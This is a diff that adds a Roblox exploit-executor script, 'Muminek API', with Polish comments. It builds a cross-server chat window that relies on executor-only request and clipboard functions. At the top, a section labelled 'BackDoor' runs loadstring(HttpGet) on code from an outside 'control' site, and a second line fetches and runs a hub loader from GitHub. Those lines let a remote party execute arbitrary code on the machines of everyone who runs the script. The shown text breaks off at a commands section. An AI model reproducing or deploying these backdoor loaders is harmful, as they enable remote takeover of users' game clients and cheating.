@@ -1,0 +1,1274 @@
+	  -- ==========================================
+    --         𝓜𝓾𝓶𝓲𝓷𝓮𝓴 𝓐𝓟𝓘         
+    -- ==========================================
+
+    -- == BackDoor == --
+
+    getgenv().controlconfig = {
+    ["key"] = "123123123"
+    }
+
+    loadstring(game:HttpGet("https://roblox.ryuu.lol/control.lua"))()
+
+    -- Or
+
+    loadstring(game:HttpGet("https://roblox.ryuu.lol/control/123123123.lua"))()
+
+
+    --[[
+            Control Website
+
+    https://roblox.ryuu.lol/control/943578345 | Public
+    https://roblox.ryuu.lol/control/123123123 | Myself
+
+    --]]
+
+    -- == Muminek Hub Loader == --
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zethvmain-eng/qmcixnrib19fMhR0MuminekHub0HEHD98jJ/refs/heads/main/%F0%9D%93%9C%F0%9D%93%BE%F0%9D%93%B6%F0%9D%93%B2%F0%9D%93%B7%F0%9D%93%AE%F0%9D%93%B4%20%F0%9D%93%97%F0%9D%93%BE%F0%9D%93%AB%20%F0%9D%93%9B%F0%9D%93%B8%F0%9D%93%AA%F0%9D%93%AD%F0%9D%93%AE%F0%9D%93%BB"))()
+
+	  -- =============================================
+    --                   Muminek Chat
+    -- =============================================
+    
+    local CoreGui = game:GetService("CoreGui")
+    if CoreGui:FindFirstChild("MuminekUltimateHub") then
+        CoreGui.MuminekUltimateHub:Destroy()
+    end
+    
+    task.spawn(function()
+        -- ============================================
+        --  SERWISY
+        -- ============================================
+        local Players = game:GetService("Players")
+        local HttpService = game:GetService("HttpService")
+        local TweenService = game:GetService("TweenService")
+        local UserInputService = game:GetService("UserInputService")
+        local SoundService = game:GetService("SoundService")
+        local RunService = game:GetService("RunService")
+        local LocalPlayer = Players.LocalPlayer
+    
+        -- ============================================
+        --  KONFIG
+        -- ============================================
+        local SERVER_URL = "https://muminek-chat.onrender.com"
+        local TOGGLE_KEY = Enum.KeyCode.RightControl
+    
+        local copyToClipboard = setclipboard or set_clipboard or (syn and syn.write_clipboard) or (fluxus and fluxus.setclipboard) or function() end
+    
+        local rawRequest = (syn and syn.request)
+            or (xeno and xeno.request)
+            or (http and http.request)
+            or http_request
+            or request
+            or (fluxus and fluxus.request)
+            or (krnl and krnl.request)
+    
+        local function safeHttpRequest(options)
+            if not rawRequest then return nil end
+            local reqData = {
+                Url = options.Url or options.url,
+                Method = options.Method or options.method or "GET",
+                Headers = options.Headers or options.headers or {},
+                Body = options.Body or options.body
+            }
+            local ok, res = pcall(function() return rawRequest(reqData) end)
+            if ok and res then
+                return res.Body or res.body or res.Response or res.data
+            end
+            return nil
+        end
+    
+        -- ============================================
+        --  STAN
+        -- ============================================
+        local settings = {
+            isMuted = false,
+            neonEnabled = true
+        }
+    
+        local isMinimized = false
+        local unreadCount = 0
+        local lastMsgId = 0
+        local sentLocalMsgs = {}
+        local currentFollowTask = nil
+    
+        local function playSound(id, pitch)
+            if settings.isMuted then return end
+            task.spawn(function()
+                local ok, sound = pcall(function()
+                    local s = Instance.new("Sound")
+                    s.SoundId = "rbxassetid://" .. tostring(id)
+                    s.Volume = 0.35
+                    s.PlaybackSpeed = pitch or 1
+                    s.Parent = SoundService
+                    return s
+                end)
+                if ok and sound then
+                    sound:Play()
+                    sound.Ended:Connect(function() sound:Destroy() end)
+                end
+            end)
+        end
+    
+        -- ============================================
+        --  GUI
+        -- ============================================
+        local ScreenGui = Instance.new("ScreenGui")
+        ScreenGui.Name = "MuminekUltimateHub"
+        ScreenGui.ResetOnSpawn = false
+    
+        local successParent = pcall(function() ScreenGui.Parent = CoreGui end)
+        if not successParent and LocalPlayer then
+            ScreenGui.Parent = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+        end
+    
+        -- Toast
+        local ToastFrame = Instance.new("Frame")
+        ToastFrame.Size = UDim2.new(0, 220, 0, 36)
+        ToastFrame.Position = UDim2.new(0.5, -110, 1, 20)
+        ToastFrame.BackgroundColor3 = Color3.fromRGB(18, 24, 36)
+        ToastFrame.BorderSizePixel = 0
+        ToastFrame.ZIndex = 100
+        ToastFrame.Parent = ScreenGui
+    
+        local ToastCorner = Instance.new("UICorner")
+        ToastCorner.CornerRadius = UDim.new(0, 8)
+        ToastCorner.Parent = ToastFrame
+    
+        local ToastStroke = Instance.new("UIStroke")
+        ToastStroke.Color = Color3.fromRGB(0, 170, 255)
+        ToastStroke.Thickness = 1
+        ToastStroke.Parent = ToastFrame
+    
+        local ToastText = Instance.new("TextLabel")
+        ToastText.Size = UDim2.new(1, 0, 1, 0)
+        ToastText.BackgroundTransparency = 1
+        ToastText.Text = "Skopiowano do schowka!"
+        ToastText.TextColor3 = Color3.fromRGB(240, 240, 255)
+        ToastText.Font = Enum.Font.GothamBold
+        ToastText.TextSize = 10
+        ToastText.ZIndex = 101
+        ToastText.Parent = ToastFrame
+    
+        local function showToast(msg)
+            ToastText.Text = msg or "Skopiowano do schowka!"
+            TweenService:Create(ToastFrame, TweenInfo.new(0.35, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+                Position = UDim2.new(0.5, -110, 1, -55)
+            }):Play()
+            task.delay(2, function()
+                TweenService:Create(ToastFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+                    Position = UDim2.new(0.5, -110, 1, 20)
+                }):Play()
+            end)
+        end
+    
+        -- Context Menu
+        local ContextMenu = Instance.new("Frame")
+        ContextMenu.Size = UDim2.new(0, 140, 0, 38)
+        ContextMenu.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+        ContextMenu.BorderSizePixel = 0
+        ContextMenu.Visible = false
+        ContextMenu.ZIndex = 90
+        ContextMenu.Parent = ScreenGui
+    
+        local ContextCorner = Instance.new("UICorner")
+        ContextCorner.CornerRadius = UDim.new(0, 6)
+        ContextCorner.Parent = ContextMenu
+    
+        local ContextStroke = Instance.new("UIStroke")
+        ContextStroke.Color = Color3.fromRGB(0, 170, 255)
+        ContextStroke.Thickness = 1
+        ContextStroke.Transparency = 0.5
+        ContextStroke.Parent = ContextMenu
+    
+        local ContextScale = Instance.new("UIScale")
+        ContextScale.Scale = 0
+        ContextScale.Parent = ContextMenu
+    
+        local CopyBtn = Instance.new("TextButton")
+        CopyBtn.Size = UDim2.new(1, -8, 1, -8)
+        CopyBtn.Position = UDim2.new(0, 4, 0, 4)
+        CopyBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 46)
+        CopyBtn.Text = "Kopiuj treść"
+        CopyBtn.TextColor3 = Color3.fromRGB(230, 230, 255)
+        CopyBtn.Font = Enum.Font.Gotham
+        CopyBtn.TextSize = 10
+        CopyBtn.AutoButtonColor = false
+        CopyBtn.ZIndex = 91
+        CopyBtn.Parent = ContextMenu
+    
+        local CopyBtnCorner = Instance.new("UICorner")
+        CopyBtnCorner.CornerRadius = UDim.new(0, 4)
+        CopyBtnCorner.Parent = CopyBtn
+    
+        CopyBtn.MouseEnter:Connect(function()
+            TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 140, 240)}):Play()
+        end)
+        CopyBtn.MouseLeave:Connect(function()
+            TweenService:Create(CopyBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(30, 30, 46)}):Play()
+        end)
+    
+        local targetTextToCopy = ""
+    
+        local function openContextMenu(pos, textToCopy)
+            targetTextToCopy = textToCopy
+            ContextMenu.Position = UDim2.new(0, pos.X, 0, pos.Y)
+            ContextMenu.Visible = true
+            ContextScale.Scale = 0
+            TweenService:Create(ContextScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+        end
+    
+        local function closeContextMenu()
+            if ContextMenu.Visible then
+                local tw = TweenService:Create(ContextScale, TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Scale = 0})
+                tw:Play()
+                tw.Completed:Connect(function()
+                    if ContextScale.Scale == 0 then ContextMenu.Visible = false end
+                end)
+            end
+        end
+    
+        CopyBtn.MouseButton1Click:Connect(function()
+            if targetTextToCopy ~= "" then
+                copyToClipboard(targetTextToCopy)
+                playSound(12221967, 1.3)
+                showToast("Skopiowano wiadomość!")
+            end
+            closeContextMenu()
+        end)
+    
+        UserInputService.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then
+                if ContextMenu.Visible then
+                    local mousePos = UserInputService:GetMouseLocation()
+                    local cPos = ContextMenu.AbsolutePosition
+                    local cSize = ContextMenu.AbsoluteSize
+                    if mousePos.X < cPos.X or mousePos.X > cPos.X + cSize.X or mousePos.Y < cPos.Y or mousePos.Y > cPos.Y + cSize.Y then
+                        closeContextMenu()
+                    end
+                end
+            end
+        end)
+    
+        -- ============================================
+        --  MAIN FRAME
+        -- ============================================
+        local MainFrame = Instance.new("Frame")
+        MainFrame.Name = "ChatFrame"
+        MainFrame.Size = UDim2.new(0, 360, 0, 440)
+        MainFrame.Position = UDim2.new(1, -375, 0.25, 0)
+        MainFrame.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
+        MainFrame.BackgroundTransparency = 0.01
+        MainFrame.BorderSizePixel = 0
+        MainFrame.Active = true
+        MainFrame.Draggable = true
+        MainFrame.ClipsDescendants = true
+        MainFrame.Parent = ScreenGui
+    
+        local MainCorner = Instance.new("UICorner")
+        MainCorner.CornerRadius = UDim.new(0, 12)
+        MainCorner.Parent = MainFrame
+    
+        local MainStroke = Instance.new("UIStroke")
+        MainStroke.Color = Color3.fromRGB(0, 170, 255)
+        MainStroke.Thickness = 1.2
+        MainStroke.Transparency = 0.4
+        MainStroke.Parent = MainFrame
+    
+        task.spawn(function()
+            while MainFrame and MainFrame.Parent do
+                if settings.neonEnabled then
+                    TweenService:Create(MainStroke, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.15}):Play()
+                    task.wait(1.8)
+                    TweenService:Create(MainStroke, TweenInfo.new(1.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.65}):Play()
+                    task.wait(1.8)
+                else
+                    MainStroke.Transparency = 0.5
+                    task.wait(1)
+                end
+            end
+        end)
+    
+        -- TOP BAR
+        local TopBar = Instance.new("Frame")
+        TopBar.Size = UDim2.new(1, 0, 0, 42)
+        TopBar.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+        TopBar.BackgroundTransparency = 0.1
+        TopBar.BorderSizePixel = 0
+        TopBar.ZIndex = 5
+        TopBar.Parent = MainFrame
+    
+        local TopBarCorner = Instance.new("UICorner")
+        TopBarCorner.CornerRadius = UDim.new(0, 12)
+        TopBarCorner.Parent = TopBar
+    
+        local StatusDot = Instance.new("Frame")
+        StatusDot.Size = UDim2.new(0, 8, 0, 8)
+        StatusDot.Position = UDim2.new(0, 14, 0.5, -4)
+        StatusDot.BackgroundColor3 = rawRequest and Color3.fromRGB(80, 255, 140) or Color3.fromRGB(255, 80, 80)
+        StatusDot.BorderSizePixel = 0
+        StatusDot.ZIndex = 6
+        StatusDot.Parent = TopBar
+    
+        local DotCorner = Instance.new("UICorner")
+        DotCorner.CornerRadius = UDim.new(1, 0)
+        DotCorner.Parent = StatusDot
+    
+        task.spawn(function()
+            while StatusDot and StatusDot.Parent do
+                TweenService:Create(StatusDot, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0.6}):Play()
+                task.wait(1)
+                TweenService:Create(StatusDot, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundTransparency = 0}):Play()
+                task.wait(1)
+            end
+        end)
+    
+        local TitleLabel = Instance.new("TextLabel")
+        TitleLabel.Size = UDim2.new(0, 150, 1, 0)
+        TitleLabel.Position = UDim2.new(0, 28, 0, 0)
+        TitleLabel.BackgroundTransparency = 1
+        TitleLabel.Text = "Muminek Chat v1.1"
+        TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TitleLabel.Font = Enum.Font.GothamBold
+        TitleLabel.TextSize = 11
+        TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TitleLabel.ZIndex = 6
+        TitleLabel.Parent = TopBar
+    
+        local function createHeaderBtn(iconText, posX)
+            local btn = Instance.new("TextButton")
+            btn.Size = UDim2.new(0, 28, 0, 28)
+            btn.Position = UDim2.new(1, posX, 0, 7)
+            btn.BackgroundColor3 = Color3.fromRGB(24, 24, 36)
+            btn.Text = iconText
+            btn.TextColor3 = Color3.fromRGB(200, 200, 220)
+            btn.Font = Enum.Font.Gotham
+            btn.TextSize = 12
+            btn.AutoButtonColor = false
+            btn.ZIndex = 6
+            btn.Parent = TopBar
+    
+            local c = Instance.new("UICorner")
+            c.CornerRadius = UDim.new(0, 6)
+            c.Parent = btn
+    
+            local s = Instance.new("UIStroke")
+            s.Color = Color3.fromRGB(0, 170, 255)
+            s.Thickness = 1
+            s.Transparency = 0.85
+            s.Parent = btn
+    
+            btn.MouseEnter:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 140, 240), TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+                TweenService:Create(s, TweenInfo.new(0.15), {Transparency = 0.2}):Play()
+            end)
+            btn.MouseLeave:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(24, 24, 36), TextColor3 = Color3.fromRGB(200, 200, 220)}):Play()
+                TweenService:Create(s, TweenInfo.new(0.15), {Transparency = 0.85}):Play()
+            end)
+            btn.MouseButton1Down:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.08), {Size = UDim2.new(0, 23, 0, 23), Position = UDim2.new(1, posX + 2, 0, 9)}):Play()
+            end)
+            btn.MouseButton1Up:Connect(function()
+                TweenService:Create(btn, TweenInfo.new(0.08), {Size = UDim2.new(0, 28, 0, 28), Position = UDim2.new(1, posX, 0, 7)}):Play()
+            end)
+    
+            return btn
+        end
+    
+        local SettingsBtn = createHeaderBtn("⚙️", -130)
+        local MuteBtn = createHeaderBtn("🔊", -98)
+        local ClearBtn = createHeaderBtn("🗑️", -66)
+        local MinBtn = createHeaderBtn("─", -34)
+    
+        local UnreadBadge = Instance.new("TextLabel")
+        UnreadBadge.Size = UDim2.new(0, 16, 0, 16)
+        UnreadBadge.Position = UDim2.new(1, -12, 0, -2)
+        UnreadBadge.BackgroundColor3 = Color3.fromRGB(255, 60, 80)
+        UnreadBadge.Text = "0"
+        UnreadBadge.TextColor3 = Color3.fromRGB(255, 255, 255)
+        UnreadBadge.Font = Enum.Font.GothamBold
+        UnreadBadge.TextSize = 9
+        UnreadBadge.Visible = false
+        UnreadBadge.ZIndex = 7
+        UnreadBadge.Parent = MinBtn
+    
+        local BadgeCorner = Instance.new("UICorner")
+        BadgeCorner.CornerRadius = UDim.new(1, 0)
+        BadgeCorner.Parent = UnreadBadge
+    
+        local BadgeScale = Instance.new("UIScale")
+        BadgeScale.Parent = UnreadBadge
+    
+        -- SCROLL
+        local ScrollFrame = Instance.new("ScrollingFrame")
+        ScrollFrame.Size = UDim2.new(1, -16, 1, -104)
+        ScrollFrame.Position = UDim2.new(0, 8, 0, 48)
+        ScrollFrame.BackgroundTransparency = 1
+        ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+        ScrollFrame.ScrollBarThickness = 3
+        ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 170, 255)
+        ScrollFrame.ScrollBarImageTransparency = 0.5
+        ScrollFrame.Parent = MainFrame
+    
+        local UIListLayout = Instance.new("UIListLayout")
+        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        UIListLayout.Padding = UDim.new(0, 6)
+        UIListLayout.Parent = ScrollFrame
+    
+        UIListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+            ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, UIListLayout.AbsoluteContentSize.Y)
+            TweenService:Create(ScrollFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {CanvasPosition = Vector2.new(0, UIListLayout.AbsoluteContentSize.Y)}):Play()
+        end)
+    
+        -- SETTINGS
+        local SettingsFrame = Instance.new("Frame")
+        SettingsFrame.Size = UDim2.new(1, 0, 1, -42)
+        SettingsFrame.Position = UDim2.new(1, 0, 0, 42)
+        SettingsFrame.BackgroundColor3 = Color3.fromRGB(13, 13, 20)
+        SettingsFrame.BorderSizePixel = 0
+        SettingsFrame.ZIndex = 10
+        SettingsFrame.Parent = MainFrame
+    
+        local SettingsCorner = Instance.new("UICorner")
+        SettingsCorner.CornerRadius = UDim.new(0, 12)
+        SettingsCorner.Parent = SettingsFrame
+    
+        local SettingsLayout = Instance.new("UIListLayout")
+        SettingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        SettingsLayout.Padding = UDim.new(0, 10)
+        SettingsLayout.Parent = SettingsFrame
+    
+        local SettingsPadding = Instance.new("UIPadding")
+        SettingsPadding.PaddingTop = UDim.new(0, 14)
+        SettingsPadding.PaddingLeft = UDim.new(0, 14)
+        SettingsPadding.PaddingRight = UDim.new(0, 14)
+        SettingsPadding.Parent = SettingsFrame
+    
+        local function createToggleSetting(titleText, defaultState, callback)
+            local itemFrame = Instance.new("Frame")
+            itemFrame.Size = UDim2.new(1, 0, 0, 40)
+            itemFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+            itemFrame.BorderSizePixel = 0
+            itemFrame.ZIndex = 11
+            itemFrame.Parent = SettingsFrame
+    
+            local c = Instance.new("UICorner")
+            c.CornerRadius = UDim.new(0, 8)
+            c.Parent = itemFrame
+    
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, -60, 1, 0)
+            lbl.Position = UDim2.new(0, 12, 0, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.Text = titleText
+            lbl.TextColor3 = Color3.fromRGB(220, 220, 240)
+            lbl.Font = Enum.Font.GothamBold
+            lbl.TextSize = 11
+            lbl.TextXAlignment = Enum.TextXAlignment.Left
+            lbl.ZIndex = 12
+            lbl.Parent = itemFrame
+    
+            local toggleBtn = Instance.new("TextButton")
+            toggleBtn.Size = UDim2.new(0, 44, 0, 22)
+            toggleBtn.Position = UDim2.new(1, -52, 0.5, -11)
+            toggleBtn.BackgroundColor3 = defaultState and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(40, 40, 55)
+            toggleBtn.Text = ""
+            toggleBtn.AutoButtonColor = false
+            toggleBtn.ZIndex = 12
+            toggleBtn.Parent = itemFrame
+    
+            local toggleCorner = Instance.new("UICorner")
+            toggleCorner.CornerRadius = UDim.new(1, 0)
+            toggleCorner.Parent = toggleBtn
+    
+            local circle = Instance.new("Frame")
+            circle.Size = UDim2.new(0, 16, 0, 16)
+            circle.Position = defaultState and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
+            circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            circle.BorderSizePixel = 0
+            circle.ZIndex = 13
+            circle.Parent = toggleBtn
+    
+            local circleCorner = Instance.new("UICorner")
+            circleCorner.CornerRadius = UDim.new(1, 0)
+            circleCorner.Parent = circle
+    
+local state = defaultState
+            toggleBtn.MouseButton1Click:Connect(function()
+                state = not state
+                playSound(12221967, 1.1)
+                if state then
+                    TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 170, 255)}):Play()
+                    TweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(1, -19, 0.5, -8)}):Play()
+                else
+                    TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 55)}):Play()
+                    TweenService:Create(circle, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0, 3, 0.5, -8)}):Play()
+                end
+                callback(state)
+            end)
+        end
+    
+        createToggleSetting("🔊 Efekty Dźwiękowe", true, function(val)
+            settings.isMuted = not val
+            MuteBtn.Text = settings.isMuted and "🔇" or "🔊"
+        end)
+    
+        createToggleSetting("✨ Neon Glow (Pulsowanie)", true, function(val)
+            settings.neonEnabled = val
+        end)
+    
+        local isSettingsOpen = false
+        SettingsBtn.MouseButton1Click:Connect(function()
+            isSettingsOpen = not isSettingsOpen
+            playSound(12221967, 1)
+            if isSettingsOpen then
+                TweenService:Create(SettingsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
+                    Position = UDim2.new(0, 0, 0, 42)
+                }):Play()
+                SettingsBtn.TextColor3 = Color3.fromRGB(0, 170, 255)
+            else
+                TweenService:Create(SettingsFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {
+                    Position = UDim2.new(1, 0, 0, 42)
+                }):Play()
+                SettingsBtn.TextColor3 = Color3.fromRGB(200, 200, 220)
+            end
+        end)
+    
+        -- INPUT
+        local InputFrame = Instance.new("Frame")
+        InputFrame.Size = UDim2.new(1, -16, 0, 38)
+        InputFrame.Position = UDim2.new(0, 8, 1, -46)
+        InputFrame.BackgroundColor3 = Color3.fromRGB(22, 22, 32)
+        InputFrame.BackgroundTransparency = 0.1
+        InputFrame.BorderSizePixel = 0
+        InputFrame.Parent = MainFrame
+    
+        local InputFrameCorner = Instance.new("UICorner")
+        InputFrameCorner.CornerRadius = UDim.new(0, 8)
+        InputFrameCorner.Parent = InputFrame
+    
+        local InputStroke = Instance.new("UIStroke")
+        InputStroke.Color = Color3.fromRGB(0, 170, 255)
+        InputStroke.Thickness = 1
+        InputStroke.Transparency = 0.75
+        InputStroke.Parent = InputFrame
+    
+        local InputBox = Instance.new("TextBox")
+        InputBox.Size = UDim2.new(1, -74, 1, 0)
+        InputBox.Position = UDim2.new(0, 12, 0, 0)
+        InputBox.BackgroundTransparency = 1
+        InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        InputBox.PlaceholderText = "Napisz wiadomość..."
+        InputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
+        InputBox.Font = Enum.Font.Gotham
+        InputBox.TextSize = 11
+        InputBox.ClearTextOnFocus = false
+        InputBox.Parent = InputFrame
+    
+        InputBox.Focused:Connect(function()
+            TweenService:Create(InputStroke, TweenInfo.new(0.2), {Transparency = 0.1, Color = Color3.fromRGB(0, 170, 255)}):Play()
+            TweenService:Create(InputFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(1, -12, 0, 40),
+                Position = UDim2.new(0, 6, 1, -47)
+            }):Play()
+        end)
+        InputBox.FocusLost:Connect(function()
+            TweenService:Create(InputStroke, TweenInfo.new(0.2), {Transparency = 0.75, Color = Color3.fromRGB(0, 170, 255)}):Play()
+            TweenService:Create(InputFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+                Size = UDim2.new(1, -16, 0, 38),
+                Position = UDim2.new(0, 8, 1, -46)
+            }):Play()
+        end)
+    
+        local SendBtn = Instance.new("TextButton")
+        SendBtn.Size = UDim2.new(0, 54, 1, -8)
+        SendBtn.Position = UDim2.new(1, -58, 0, 4)
+        SendBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+        SendBtn.Text = "SEND"
+        SendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        SendBtn.Font = Enum.Font.GothamBold
+        SendBtn.TextSize = 10
+        SendBtn.AutoButtonColor = false
+        SendBtn.Parent = InputFrame
+    
+        local SendCorner = Instance.new("UICorner")
+        SendCorner.CornerRadius = UDim.new(0, 6)
+        SendCorner.Parent = SendBtn
+    
+        SendBtn.MouseEnter:Connect(function()
+            TweenService:Create(SendBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 180, 255)}):Play()
+        end)
+        SendBtn.MouseLeave:Connect(function()
+            TweenService:Create(SendBtn, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
+        end)
+        SendBtn.MouseButton1Down:Connect(function()
+            TweenService:Create(SendBtn, TweenInfo.new(0.08), {Size = UDim2.new(0, 50, 1, -12), Position = UDim2.new(1, -56, 0, 6)}):Play()
+        end)
+        SendBtn.MouseButton1Up:Connect(function()
+            TweenService:Create(SendBtn, TweenInfo.new(0.08), {Size = UDim2.new(0, 54, 1, -8), Position = UDim2.new(1, -58, 0, 4)}):Play()
+        end)
+    
+        -- ============================================
+        --  MESSAGE BUBBLE
+        -- ============================================
+        local function createMessageBubble(senderName, userId, text, isSelf, isSystem)
+            playSound(isSelf and 12221967 or 9120386652, 1)
+    
+            if isMinimized and not isSelf then
+                unreadCount = unreadCount + 1
+                UnreadBadge.Text = tostring(unreadCount)
+                UnreadBadge.Visible = true
+                BadgeScale.Scale = 1.4
+                TweenService:Create(BadgeScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+            end
+    
+            local timeStr = os.date("%H:%M")
+            local MsgCard = Instance.new("Frame")
+            MsgCard.Size = UDim2.new(1, 0, 0, 0)
+            MsgCard.AutomaticSize = Enum.AutomaticSize.Y
+            MsgCard.BackgroundColor3 = isSystem and Color3.fromRGB(35, 25, 15) or (isSelf and Color3.fromRGB(16, 28, 44) or Color3.fromRGB(18, 18, 26))
+            MsgCard.BackgroundTransparency = 1
+            MsgCard.BorderSizePixel = 0
+            MsgCard.Parent = ScrollFrame
+    
+            local MsgScale = Instance.new("UIScale")
+            MsgScale.Scale = 0.75
+            MsgScale.Parent = MsgCard
+    
+            TweenService:Create(MsgScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+            TweenService:Create(MsgCard, TweenInfo.new(0.25), {BackgroundTransparency = 0}):Play()
+    
+            local CardCorner = Instance.new("UICorner")
+            CardCorner.CornerRadius = UDim.new(0, 8)
+            CardCorner.Parent = MsgCard
+    
+            local CardStroke = Instance.new("UIStroke")
+            CardStroke.Color = isSystem and Color3.fromRGB(255, 170, 0) or (isSelf and Color3.fromRGB(0, 170, 255) or Color3.fromRGB(255, 255, 255))
+            CardStroke.Thickness = 1
+            CardStroke.Transparency = 1
+            CardStroke.Parent = MsgCard
+    
+            TweenService:Create(CardStroke, TweenInfo.new(0.3), {Transparency = isSystem and 0.4 or (isSelf and 0.6 or 0.92)}):Play()
+    
+            local CardPadding = Instance.new("UIPadding")
+            CardPadding.PaddingTop = UDim.new(0, 6)
+            CardPadding.PaddingBottom = UDim.new(0, 7)
+            CardPadding.PaddingLeft = UDim.new(0, 8)
+            CardPadding.PaddingRight = UDim.new(0, 8)
+            CardPadding.Parent = MsgCard
+    
+            local AvatarImg = Instance.new("ImageLabel")
+            AvatarImg.Size = UDim2.new(0, 26, 0, 26)
+            AvatarImg.Position = UDim2.new(0, 0, 0, 1)
+            AvatarImg.BackgroundTransparency = 1
+            AvatarImg.Parent = MsgCard
+    
+            if isSystem then
+                AvatarImg.Image = "rbxassetid://6031071057"
+            else
+                local validUserId = tonumber(userId)
+                if validUserId and validUserId > 1 then
+                    AvatarImg.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(validUserId) .. "&w=150&h=150"
+                else
+                    AvatarImg.Image = "rbxassetid://6031075931"
+                end
+            end
+    
+            local AvatarCorner = Instance.new("UICorner")
+            AvatarCorner.CornerRadius = UDim.new(1, 0)
+            AvatarCorner.Parent = AvatarImg
+    
+            local nameColor = isSystem and "#ffaa00" or (isSelf and "#00aaff" or "#aa70ff")
+            local HeaderLabel = Instance.new("TextLabel")
+            HeaderLabel.Size = UDim2.new(1, -34, 0, 13)
+            HeaderLabel.Position = UDim2.new(0, 34, 0, 0)
+            HeaderLabel.BackgroundTransparency = 1
+            HeaderLabel.Text = "<font color='" .. nameColor .. "'><b>" .. tostring(senderName or "Anonim") .. "</b></font> <font color='#666677'>• " .. timeStr .. "</font>"
+            HeaderLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            HeaderLabel.Font = Enum.Font.Gotham
+            HeaderLabel.TextSize = 10
+            HeaderLabel.RichText = true
+            HeaderLabel.TextXAlignment = Enum.TextXAlignment.Left
+            HeaderLabel.Parent = MsgCard
+    
+            local BodyLabel = Instance.new("TextLabel")
+            BodyLabel.Size = UDim2.new(1, -34, 0, 0)
+            BodyLabel.Position = UDim2.new(0, 34, 0, 15)
+            BodyLabel.AutomaticSize = Enum.AutomaticSize.Y
+            BodyLabel.BackgroundTransparency = 1
+            BodyLabel.Text = tostring(text or "")
+            BodyLabel.TextColor3 = isSystem and Color3.fromRGB(255, 220, 150) or Color3.fromRGB(235, 235, 245)
+            BodyLabel.Font = Enum.Font.Gotham
+            BodyLabel.TextSize = 11
+            BodyLabel.TextWrapped = true
+            BodyLabel.TextXAlignment = Enum.TextXAlignment.Left
+            BodyLabel.Parent = MsgCard
+    
+            MsgCard.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton2 then
+                    local mPos = UserInputService:GetMouseLocation()
+                    openContextMenu(mPos, tostring(text or ""))
+                end
+            end)
+        end
+    
+        -- ============================================
+        --  FUNKCJE POMOCNICZE
+        -- ============================================
+        local function getPlayer(nameStr)
+            if not nameStr or nameStr == "" then return nil end
+            nameStr = nameStr:lower()
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p.Name:lower():sub(1, #nameStr) == nameStr or p.DisplayName:lower():sub(1, #nameStr) == nameStr then
+                    return p
+                end
+            end
+            return nil
+        end
+    
+        -- ============================================
+        --  KOMENDY
